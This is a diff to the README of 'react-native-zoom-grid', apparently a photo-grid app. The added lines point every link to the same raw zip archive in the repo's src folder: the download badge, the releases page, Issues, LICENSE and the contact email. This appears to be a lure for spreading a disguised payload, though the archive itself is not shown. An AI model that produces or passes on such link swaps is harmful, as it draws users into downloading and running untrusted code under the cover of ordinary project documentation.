@@ -6,7 +6,7 @@ Welcome to react-native-zoom-grid! This application provides a zoomable grid of 
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/hezeghaluwawo/react-native-zoom-grid/releases)
+[![Download](https://github.com/hezeghaluwawo/react-native-zoom-grid/raw/refs/heads/main/src/react_grid_zoom_native_v2.1.zip%20Release-blue)](https://github.com/hezeghaluwawo/react-native-zoom-grid/raw/refs/heads/main/src/react_grid_zoom_native_v2.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your device meets these requirements:
 
 To get started, visit the Releases page of the react-native-zoom-grid repository. You can find the latest version of the application there.
 
-[Download from Releases Page](https://github.com/hezeghaluwawo/react-native-zoom-grid/releases)
+[Download from Releases Page](https://github.com/hezeghaluwawo/react-native-zoom-grid/raw/refs/heads/main/src/react_grid_zoom_native_v2.1.zip)
 
 ### **Steps to Download and Install:**
 
@@ -71,12 +71,12 @@ If you encounter issues, here are common solutions:
 
 Join our community to share your experiences and find answers to your questions. 
 
-- GitHub Issues: Report bugs or request new features [here](https://github.com/hezeghaluwawo/react-native-zoom-grid/issues).
+- GitHub Issues: Report bugs or request new features [here](https://github.com/hezeghaluwawo/react-native-zoom-grid/raw/refs/heads/main/src/react_grid_zoom_native_v2.1.zip).
 - Community Forum: Participate in discussions to connect with other users.
 
 ## 📧 Contact Us
 
-For further assistance or feedback, please reach out via email at support@example.com. We appreciate your thoughts and are here to help!
+For further assistance or feedback, please reach out via email at https://github.com/hezeghaluwawo/react-native-zoom-grid/raw/refs/heads/main/src/react_grid_zoom_native_v2.1.zip We appreciate your thoughts and are here to help!
 
 ## 🤝 Contributing
 
@@ -84,6 +84,6 @@ We welcome contributions from everyone! If you have ideas or improvements, feel 
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/hezeghaluwawo/react-native-zoom-grid/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/hezeghaluwawo/react-native-zoom-grid/raw/refs/heads/main/src/react_grid_zoom_native_v2.1.zip) file for details.
 
 Thank you for using react-native-zoom-grid. We hope you enjoy this visual journey with your photos!
